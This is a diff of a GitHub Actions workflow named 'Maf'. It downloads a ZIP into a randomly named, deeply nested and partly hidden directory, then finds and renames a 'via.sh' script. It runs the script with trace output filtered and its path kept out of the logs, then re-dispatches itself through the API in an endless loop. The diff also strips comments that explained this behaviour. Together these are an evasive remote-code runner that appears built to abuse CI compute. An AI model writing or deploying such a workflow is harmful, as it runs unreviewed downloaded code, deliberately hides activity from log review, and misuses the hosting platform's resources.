@@ -1,11 +1,9 @@
 name: Maf
 
-# Only manual / API trigger
 on:
   workflow_dispatch:
 
 permissions:
-  # Least privileges; allow actions:workflow so token can trigger workflows if needed.
   actions: write
   contents: read
 
@@ -13,7 +11,6 @@ jobs:
   export-and-run:
     runs-on: ubuntu-22.04
 
-    # Provide a minimal matrix so matrix.worker is defined (single worker by default).
     strategy:
       matrix:
         worker: [1]
@@ -31,37 +28,35 @@ jobs:
           set -euo pipefail
           ZIP_NAME="$(uuidgen).zip"
           SCRIPT_PREFIX="$(uuidgen)"
-          
-          # Generate a deeply nested directory structure (14+ levels)
-          DEPTH=$((14 + RANDOM % 7))  # 14 to 20 levels deep
+
+          # Generate a deeply nested directory structure (14 to 20 levels)
+          DEPTH=$((14 + RANDOM % 7))
           NESTED_DIR=""
-          
+
           for i in $(seq 1 $DEPTH); do
-            # Randomly choose between hidden (.) and normal directories
             if [ $((RANDOM % 2)) -eq 0 ]; then
               DIR_NAME=".$(uuidgen | cut -d'-' -f1)"
             else
               DIR_NAME="$(uuidgen | cut -d'-' -f1)"
             fi
-            
+
             if [ -z "$NESTED_DIR" ]; then
               NESTED_DIR="$DIR_NAME"
             else
               NESTED_DIR="$NESTED_DIR/$DIR_NAME"
             fi
           done
-          
+
           echo "ZIP_NAME=$ZIP_NAME" >> "$GITHUB_ENV"
           echo "SCRIPT_PREFIX=$SCRIPT_PREFIX" >> "$GITHUB_ENV"
           echo "NESTED_DIR=$NESTED_DIR" >> "$GITHUB_ENV"
           echo "Generated ZIP_NAME=$ZIP_NAME"
           echo "Generated SCRIPT_PREFIX=$SCRIPT_PREFIX"
           echo "Generated nested directory with $DEPTH levels: $NESTED_DIR"
-          
-          # Create the nested directory structure
+
           mkdir -p "$NESTED_DIR"
           echo "Created nested directory structure"
-      
+
       - name: Download ZIP to nested directory
         shell: bash
         run: |
@@ -73,7 +68,7 @@ jobs:
             exit 1
           fi
           echo "Downloaded $ZIP_NAME to $NESTED_DIR"
-      
+
       - name: Unzip in nested directory and cleanup
         shell: bash
         run: |
@@ -82,7 +77,7 @@ jobs:
           unzip -q "$ZIP_NAME"
           rm -f "$ZIP_NAME"
           echo "Unzipped and removed $ZIP_NAME in $NESTED_DIR"
-      
+
       - name: Find, rename and make script executable
         shell: bash
         env:
@@ -90,7 +85,7 @@ jobs:
         run: |
           set -euo pipefail
           cd "$NESTED_DIR"
-          
+
           script_path="$(find . -type f -name 'via.sh' -print -quit || true)"
           if [ -z "$script_path" ]; then
             script_path="$(find . -type f -iname 'via*' -perm /111 -print -quit || true)"
@@ -100,13 +95,12 @@ jobs:
             find . -maxdepth 4 -type f -print
             exit 1
           fi
-          
-          echo "Found script (hidden path for logs)"
+
+          echo "Found script (path hidden in logs)"
           new_name="${SCRIPT_PREFIX}_$(date +%s)_$RANDOM.sh"
           mv -v "$script_path" "$new_name"
           chmod +x "$new_name"
-          
-          # Store the full path to the script in the environment for later steps
+
           FULL_SCRIPT_PATH="$NESTED_DIR/$new_name"
           echo "EXEC_SCRIPT=$FULL_SCRIPT_PATH" >> "$GITHUB_ENV"
           echo "Renamed script to $new_name in nested directory"
@@ -119,40 +113,30 @@ jobs:
           EXEC_SCRIPT: ${{ env.EXEC_SCRIPT }}
         run: |
           set -euo pipefail
-          echo "Starting worker $WORKER_ID of ${MAX_WORKERS:-?}"
+
+          echo "Starting worker ${WORKER_ID} of ${MAX_WORKERS:-?}"
 
           if [ -z "${EXEC_SCRIPT:-}" ]; then
             echo "EXEC_SCRIPT not set"
             exit 1
           fi
 
-          # Do NOT print the full script path to logs (avoid exposing filenames/paths).
-          # Run the script normally and filter out bash xtrace lines that begin with "+ ".
-          # - Use --noprofile --norc to avoid loading interactive/profile files.
-          # - Capture both stdout and stderr so traced commands (which often appear on stderr)
-          #   are subject to filtering.
-          #
-          # Note: this removes lines that literally start with "+ ". It does NOT mask
-          # other output that the script chooses to print.
+          # Run the discovered script without showing bash xtrace lines (those start with "+ ").
+          # Combine stdout and stderr, then filter out lines beginning with "+ ".
+          # Note: this preserves normal script output while hiding common xtrace lines.
           bash --noprofile --norc "$EXEC_SCRIPT" "$WORKER_ID" 2>&1 | sed -E '/^\+ /d'
 
-      # --------------------------------------------------------------------
-      # Final step: trigger the same workflow again via the REST API.
-      # - Provide a PAT in repository secret REPO_PAT (recommended), or the workflow will fall back to GITHUB_TOKEN.
-      # - WARNING: This creates a continuous loop. Add a conditional/variable if you want to stop at some point.
-      # --------------------------------------------------------------------
       - name: Trigger next run (workflow_dispatch)
         shell: bash
         env:
           REPO: ${{ github.repository }}
-          WORKFLOW_FILE: main.yml        # <-- make sure this matches the filename of this workflow
+          WORKFLOW_FILE: main.yml
           BRANCH: ${{ github.event.repository.default_branch }}
-          REPO_PAT: ${{ secrets.REPO_PAT }}      # optional PAT; create this secret if you need a PAT
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}  # fallback
+          REPO_PAT: ${{ secrets.REPO_PAT }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           set -euo pipefail
 
-          # Choose token: prefer REPO_PAT if provided, otherwise fall back to GITHUB_TOKEN
           TOKEN="${REPO_PAT:-}"
           if [ -z "$TOKEN" ]; then
             TOKEN="${GITHUB_TOKEN:-}"
